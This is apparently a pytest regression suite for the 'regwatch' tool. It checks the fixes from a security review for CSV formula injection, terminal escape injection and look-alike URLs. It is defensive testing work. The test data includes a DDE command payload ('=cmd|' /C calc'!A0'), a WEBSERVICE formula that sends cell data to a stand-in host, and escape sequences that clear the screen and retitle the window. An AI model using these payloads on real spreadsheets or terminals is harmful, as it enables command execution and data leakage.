"""Regression tests for the findings of the second adversarial security review.

Each section is named after the finding it covers. Every test here fails when the
fix for its finding is removed.
"""

from __future__ import annotations

import csv
import io
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from regwatch.cli import main
from regwatch.export import RECORD_COLUMNS, neutralise_cell, records_csv

FORMULA_CHARS = ("=", "+", "-", "@", "\t", "\r", "\n")

# --- rw-01 and rw-14: csv injection through semicolons and lookalike characters ---------


def _fields_starting_with_formula(text: str, delimiter: str) -> list[str]:
    rows = list(csv.reader(io.StringIO(text), delimiter=delimiter))
    return [cell for row in rows for cell in row if cell[:1] in FORMULA_CHARS]


def test_export_is_safe_when_a_spreadsheet_splits_on_semicolons(
    project: Path,
    edit_json: Callable[[Path, Callable[[Any], None]], None],
    tmp_path: Path,
) -> None:
    def hostile(data: Any) -> None:
        data["topics_vocabulary"] += ["safe", "=cmd|' /C calc'!A0"]
        entry = data["detail"]["nl-allergen-order"]
        entry["summary"] = "x;=1+1;y"
        entry["impacts"] = 'see note;=WEBSERVICE("https://tracker.example/?"&A2);end'
        entry["topics"] = ["safe", "=cmd|' /C calc'!A0"]

    edit_json(project.parent / "register" / "detail.json", hostile)
    out = tmp_path / "out.csv"
    assert main(["--config", str(project), "export", "--csv", str(out)]) == 0
    text = out.read_text(encoding="utf-8")
    assert "=1+1" in text
    for delimiter in (",", ";"):
        assert _fields_starting_with_formula(text, delimiter) == [], delimiter
    # The text that follows a semicolon inside a field is neutralised as well.
    [row] = [
        r for r in csv.DictReader(io.StringIO(text)) if r["obligation_id"] == "nl-allergen-order"
    ]
    assert row["summary"] == "x;'=1+1;y"
    assert row["topics"] == "safe;'=cmd|' /C calc'!A0"


def test_every_csv_field_is_quoted() -> None:
    row = {column: "plain" for column in RECORD_COLUMNS}
    text = records_csv([row])
    for line in text.splitlines():
        assert line.startswith('"') and line.endswith('"')


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (" =1", "' =1"),
        ("\xa0=1", "'\xa0=1"),
        ("\u200b=1", "'\u200b=1"),
        ("\n=1", "'\n'=1"),
        ("\uff1d1", "'\uff1d1"),
        ("\uff0b1", "'\uff0b1"),
        ("\uff0d1", "'\uff0d1"),
        ("\uff20x", "'\uff20x"),
        ("a;=1", "a;'=1"),
        ("a,=1", "a,'=1"),
        ("a;  @x", "a;'  @x"),
        ("a\t=1", "a\t'=1"),
        ("a\n+1", "a\n'+1"),
        ("a;\u200b-1", "a;'\u200b-1"),
    ],
)
def test_neutralise_cell_covers_separators_whitespace_and_lookalikes(
    value: str, expected: str
) -> None:
    assert neutralise_cell(value) == expected


@pytest.mark.parametrize("value", ["a=b", "a;b=c", "1-2", "a, b", "x@y", "plain", ""])
def test_neutralise_cell_leaves_ordinary_text_alone(value: str) -> None:
    assert neutralise_cell(value) == value


# --- rw-02: terminal escapes through capture ---------------------------------------------

ESC = "\x1b"
HOSTILE = f"x{ESC}[2Jy\r\nz"


def test_fetch_error_cleans_its_own_message() -> None:
    from regwatch.fetch import FetchError

    message = str(FetchError(HOSTILE))
    assert message == "x [2Jy z"
    assert len(str(FetchError("a" * 5000))) <= 1000


def test_a_servers_status_line_cannot_reach_the_terminal() -> None:
    from test_fetch import make, web

    from regwatch.fetch import FetchError

    payload = f"{ESC}[2J{ESC}]0;owned\x07FAKE 200 OK\r\n\r\n".encode()
    network = web(payload)
    with pytest.raises(FetchError) as caught:
        make(network).fetch("https://example.org/")
    assert ESC not in str(caught.value)
    assert "\x07" not in str(caught.value)
    assert "\n" not in str(caught.value)


def test_capture_prints_no_escape_and_no_extra_line(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    from conftest import FakeFetcher

    from regwatch.fetch import FetchError

    class Hostile(FakeFetcher):
        def fetch(self, url: str) -> str:
            raise FetchError(HOSTILE)

    assert main(["--config", str(project), "capture"], fetcher=Hostile()) == 1
    out = capsys.readouterr().out
    assert ESC not in out
    for line in out.splitlines():
        assert line.startswith(("skipped", "captured", "regwatch capture")), line


# --- rw-03: register and catalogue values printed raw ----------------------------------

SEQUENCE = f"{ESC}]0;owned\x07{ESC}[31m\x9b2J"
TEXT_KEYS = frozenset(
    {
        "name",
        "title",
        "label",
        "definition",
        "summary",
        "impacts",
        "implications",
        "action",
        "headline",
        "what_happened",
        "theme",
        "what_triggers",
        "why",
        "note",
        "notes",
        "disclaimer",
        "kind",
        "level",
        "agency",
        "citation",
    }
)
CSV_TEXT_COLUMNS = ("citation", "title", "key_date_note", "notes")


def _poison(value: Any) -> Any:
    """Append a terminal escape sequence to every free text string in a JSON value."""
    if isinstance(value, dict):
        return {
            key: (item + SEQUENCE if key in TEXT_KEYS and isinstance(item, str) else _poison(item))
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [_poison(item) for item in value]
    return value


def hostile_project(project: Path) -> Path:
    """Put a terminal escape sequence in every text field of the example project."""
    import json

    register = project.parent / "register"
    for path in register.glob("*.json"):
        data = json.loads(path.read_text(encoding="utf-8"))
        path.write_text(json.dumps(_poison(data)), encoding="utf-8")
    csv_path = register / "obligations.csv"
    rows = list(csv.DictReader(io.StringIO(csv_path.read_text(encoding="utf-8"))))
    with csv_path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        for row in rows:
            for column in CSV_TEXT_COLUMNS:
                row[column] += SEQUENCE
            writer.writerow(row)
    catalogue = project.parent / "catalogue.json"
    catalogue.write_text(
        json.dumps(
            {
                "focus_areas": [
                    {
                        "focus_id": "hostile",
                        "label": f"Label{SEQUENCE}",
                        "description": f"Description{SEQUENCE}",
                        "terms": ["allergen"],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    project.write_text(
        project.read_text(encoding="utf-8")
        + '\n[profile]\nfocus_areas = ["hostile"]\ncatalogue = "catalogue.json"\n',
        encoding="utf-8",
    )
    return project


def assert_clean(captured: pytest.CaptureResult[str]) -> None:
    for stream in (captured.out, captured.err):
        assert ESC not in stream
        assert "\x9b" not in stream
        assert "\x07" not in stream


PRINTING_COMMANDS = [
    ["list"],
    ["coverage"],
    ["portfolio"],
    ["impact"],
    ["themes"],
    ["config", "show"],
    ["check"],
    ["validate"],
]


@pytest.mark.parametrize("command", PRINTING_COMMANDS, ids=" ".join)
def test_a_register_with_escape_sequences_is_refused_without_printing_them(
    project: Path, capsys: pytest.CaptureFixture[str], command: list[str]
) -> None:
    hostile_project(project)
    code = main(["--config", str(project), *command])
    assert_clean(capsys.readouterr())
    if command[0] == "config":
        assert code == 0
    else:
        assert code == 1


def test_validation_names_the_field_with_a_control_character(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    hostile_project(project)
    assert main(["--config", str(project), "validate"]) == 1
    out = capsys.readouterr().out
    assert "contains a control character" in out
    assert "errors=" in out


@pytest.mark.parametrize("command", PRINTING_COMMANDS, ids=" ".join)
def test_console_output_is_cleaned_even_when_validation_lets_a_value_through(
    project: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
    command: list[str],
) -> None:
    hostile_project(project)
    monkeypatch.setattr("regwatch.register._validate_raw", lambda raw: [])
    main(["--config", str(project), *command])
    captured = capsys.readouterr()
    assert_clean(captured)
    if command[0] in ("list", "portfolio", "coverage"):
        assert captured.out.strip()


def test_validation_errors_do_not_echo_a_bad_value_raw(
    project: Path,
    capsys: pytest.CaptureFixture[str],
    edit_json: Callable[[Path, Callable[[Any], None]], None],
) -> None:
    def poison(data: Any) -> None:
        data["jurisdictions"][0]["jurisdiction_id"] = f"bad{SEQUENCE}"

    edit_json(project.parent / "register" / "jurisdictions.json", poison)
    assert main(["--config", str(project), "validate"]) == 1
    captured = capsys.readouterr()
    assert_clean(captured)
    assert "ERROR jurisdictions entry 1 (bad " in captured.out


def test_a_register_error_is_printed_clean(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    hostile_project(project)
    assert main(["--config", str(project), "list"]) == 1
    captured = capsys.readouterr()
    assert_clean(captured)
    assert "error: the register has" in captured.err


# --- rw-11: bidirectional controls, zero-width characters and look-alike hosts ---------------


def test_clean_text_removes_bidirectional_and_zero_width_characters() -> None:
    from regwatch.sanitize import clean_line, clean_text

    text = "a\u202eb\u2066c\u200bd\u2028e\u2029f\ufeffg"
    assert clean_text(text) == "abcd e fg"
    assert clean_line(text) == "abcd e fg"
    assert clean_line("a  b") == "a  b"


@pytest.mark.parametrize(
    "url",
    [
        "https://ex\u0430mple.gov/",
        "https://\xe9xample.gov/",
        "https://example.gov/a\u202eb",
        "https://example.gov/a\u200bb",
        "https://example.gov/a\u2028b",
    ],
)
def test_look_alike_hosts_and_invisible_characters_are_refused(url: str) -> None:
    from regwatch.sanitize import safe_https_url

    assert safe_https_url(url) == ""
    assert safe_https_url("https://xn--exmple-cua.gov/") == "https://xn--exmple-cua.gov/"
